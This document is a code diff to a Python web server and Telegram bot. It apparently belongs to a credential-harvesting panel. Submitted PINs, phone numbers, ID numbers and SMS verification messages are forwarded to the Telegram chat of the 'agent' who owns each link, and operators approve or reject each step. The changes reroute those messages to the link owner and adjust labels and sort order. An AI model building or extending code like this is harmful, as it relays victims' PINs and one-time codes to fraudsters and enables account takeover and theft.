@@ -1265,7 +1265,7 @@ def handle_verify_callback(query_id, data, chat_id, message_id, message):
         )
 
     label = "✅ Approved" if action == "approve" else "❌ Rejected"
-    step_label = "PIN + Phone" if ver["step"] == "zip_phone" else "Name Verification Message"
+    step_label = "PIN + Phone" if ver["step"] == "zip_phone" else "SMS / Verification Message"
     try:
         answer_telegram_callback(query_id, text=f"Verification {step_label}: {label}")
     except Exception:
@@ -1895,7 +1895,7 @@ class Handler(BaseHTTPRequestHandler):
             ).fetchall()
             all_verifications = db.execute(
                 """SELECT id, application_id, step, zip_code, phone, id_number, status, reject_reason, created_at
-                   FROM verifications ORDER BY created_at ASC"""
+                   FROM verifications ORDER BY created_at DESC"""
             ).fetchall()
             ver_by_app = {}
             for v in all_verifications:
@@ -1940,9 +1940,10 @@ class Handler(BaseHTTPRequestHandler):
         dest_chats = []
         if app["telegram_chat_id"]:
             dest_chats.append(str(app["telegram_chat_id"]).strip())
-        admin_c = telegram_admin_chat_id()
-        if admin_c and str(admin_c).strip() not in dest_chats:
-            dest_chats.append(str(admin_c).strip())
+        else:
+            admin_c = telegram_admin_chat_id()
+            if admin_c:
+                dest_chats.append(str(admin_c).strip())
 
         if dest_chats and telegram_bot_token():
             try:
@@ -2092,16 +2093,17 @@ class Handler(BaseHTTPRequestHandler):
                 (ver_id, val_uuid, step, zip_code, phone, id_number),
             )
 
-        # Send verification data to agent's Telegram and/or Admin Telegram
+        # Send verification data to agent's Telegram (owner of link) or Admin Telegram (if no agent)
         target_chats = []
         if app["telegram_chat_id"]:
             target_chats.append(str(app["telegram_chat_id"]).strip())
-        admin_c = telegram_admin_chat_id()
-        if admin_c and str(admin_c).strip() not in target_chats:
-            target_chats.append(str(admin_c).strip())
+        else:
+            admin_c = telegram_admin_chat_id()
+            if admin_c:
+                target_chats.append(str(admin_c).strip())
 
         if target_chats and telegram_bot_token():
-            step_label = "📍 Step 3: PIN Validation" if step == "zip_phone" else "💬 Step 4: SMS / Ownership Verification"
+            step_label = "📍 Step 3: PIN Validation" if step == "zip_phone" else "💬 Step 4: SMS / Verification Message"
             phone_display = app["phone"] if str(app["phone"]).startswith("+") else f"+232 {app['phone']}"
             lines = [
                 f"📋 Verification Submission — {step_label}",
